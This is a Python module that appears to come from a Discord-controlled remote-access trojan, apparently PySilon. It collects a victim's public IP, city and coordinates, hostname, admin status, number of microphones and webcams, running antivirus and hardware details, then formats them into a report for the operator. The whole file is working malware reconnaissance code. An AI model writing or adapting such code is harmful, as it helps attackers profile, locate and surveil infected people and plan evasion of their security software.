#<imports>
import os
import json
import ctypes
import psutil
import requests
import platform
import subprocess
from datetime import datetime
from urllib.request import urlopen
from screeninfo import get_monitors
import resources.modules.av_detect as pysilon_av_detect
#</imports>

class grab_info:
    def __init__(self):
        self.prepare_info()

    def prepare_info(self):
        info = self.get_info()
        return f'''
> **»** Started at:  **<t:{info['start_time']}:f>**
> **»** {render_text('Elevated')} permissions:  **`{info['is_admin']}`**
> **»** {render_text('IP')}:  **`{info['ip']}`**
> **»** Country:  **`{info['country']}`**
> **»** City:  **`{info['city']}`**
> **»** Latitude:  **`{info['latitude']}`**
> **»** Longitude:  **`{info['longitude']}`**
> **»** {render_text('Hostname')}:  **`{info['host_name']}`**
> **»** OS:  **`Windows {info['release']}`**
> **»** {render_text('Microphones')}:  **`{info['microphones']}`**
> **»** {render_text('Webcams')}:  **`{info['webcams']}`**
> **»** Monitors:  **`{info['monitors']}`**
> **»** {render_text('Antivirus')}:  **`{', '.join(info['antivirus']) if isinstance(info['antivirus'], list) else info['antivirus']}`**
> **»** {render_text('CPU')}:  **`{info['cpu']}`**
> **»** {render_text('GPU')}:  **`{', '.join(info['gpu']) if isinstance(info['gpu'], list) else info['gpu']}`**
> **»** {render_text('RAM')}:  **`{info['ram']}`**
> **»** Install Date:  **`{info['install_date']}`**'''

    def get_ip_info(self, ip):
        try: return json.loads(requests.get(f'https://geolocation-db.com/jsonp/{ip}').content.decode().split("(")[1].strip(")"))
        except Exception: return {'country_name': 'Unknown', 'city': 'Unknown', 'latitude': 'Unknown', 'longitude': 'Unknown', 'state': 'Unknown'}

    def get_info(self):
        info = {}
        try:
            info['ip'] = urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8').strip()
            ip_info = self.get_ip_info(info['ip'])
            info['country'] = ip_info['country_name']
            info['city'] = ip_info['city']
            info['latitude'] = ip_info['latitude']
            info['longitude'] = ip_info['longitude']
            info['state'] = ip_info['state']
        except Exception:
            info['ip'] = 'Unknown'
            info['country'] = 'Unknown'
            info['city'] = 'Unknown'
            info['latitude'] = 'Unknown'
            info['longitude'] = 'Unknown'
            info['state'] = 'Unknown'
        try:
            uname = platform.uname()
            info['system'] = uname.system
            info['host_name'] = uname.node
            info['release'] = uname.release
            info['version'] = uname.version
            info['machine'] = uname.machine
            info['processor'] = uname.processor
        except Exception:
            info['system'] = 'Unknown'
            info['host_name'] = 'Unknown'
            info['release'] = 'Unknown'
            info['version'] = 'Unknown'
            info['machine'] = 'Unknown'
            info['processor'] = 'Unknown'
        
        try: info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception: info['is_admin'] = 'Unknown'
        
        try: info['start_time'] = str(datetime.timestamp(datetime.now())).split('.')[0]
        except Exception: info['start_time'] = 'Unknown'
        
        try: info['microphones'] = self.get_microphone_count()
        except Exception: info['microphones'] = 'Unknown'
        
        try:
            webcams = self.get_video_devices()
            info['webcams'] = len(webcams) if webcams != 'Unknown' else 'Unknown'
        except Exception: info['webcams'] = 'Unknown'
        
        try:
            monitors = get_monitors()
            info['monitors'] = len(monitors) if monitors != 'Unknown' else 'Unknown'
        except Exception: info['monitors'] = 'Unknown'
        
        try: info['cpu'] = self.get_cpu_info()
        except Exception: info['cpu'] = 'Unknown'
        
        try: info['gpu'] = self.get_gpu_info()
        except Exception: info['gpu'] = 'Unknown'
        
        try: info['ram'] = f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB"
        except Exception: info['ram'] = 'Unknown'
        
        try: info['install_date'] = self.get_install_date()
        except Exception: info['install_date'] = 'Unknown'

        try: info['antivirus'] = pysilon_av_detect.check_running_antivirus()
        except Exception: info['antivirus'] = 'Unknown'
        
        return info

    def get_microphone_count(self):
        try:
            result = subprocess.check_output(
                'powershell "Get-PnpDevice -Class AudioEndpoint | Select-Object -Property FriendlyName"', 
                shell=True
            ).decode()
            devices = result.split("\n")[3:-1]
            microphones = set()
            for device in devices:
                device_name = device.strip()
                if 'Microphone' in device_name and 'High Definition Audio' not in device_name:
                    microphones.add(device_name)
            return len(microphones)
        except Exception: return 'Unknown'

    def get_video_devices(self):
        try:
            result = subprocess.check_output(
                'powershell "Get-WmiObject Win32_PnPEntity | Where-Object { $_.Service -eq \'usbvideo\' } | Select-Object -Property Name"', 
                shell=True
            ).decode()
            devices = result.split("\n")[3:-1]
            return [device.strip() for device in devices if device.strip()]
        except Exception: return 'Unknown'

    def get_monitors(self):
        try: return [str(monitor) for monitor in get_monitors()]
        except Exception: return 'Unknown'

    def get_cpu_info(self):
        try:
            result = subprocess.check_output('wmic cpu get name', shell=True).decode()
            cpu_info = result.split("\n")[1].strip()
            return cpu_info
        except Exception: return 'Unknown'

    def get_gpu_info(self):
        try:
            result = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode()
            devices = result.split("\n")[1:-1]
            return [device.strip() for device in devices if device.strip()]
        except Exception: return 'Unknown'

    def get_install_date(self):
        try:
            file_creation_time = os.path.getctime(__file__)
            install_date = datetime.fromtimestamp(file_creation_time).strftime('%Y-%m-%d %H:%M:%S')
            return install_date
        except Exception: return 'Unknown'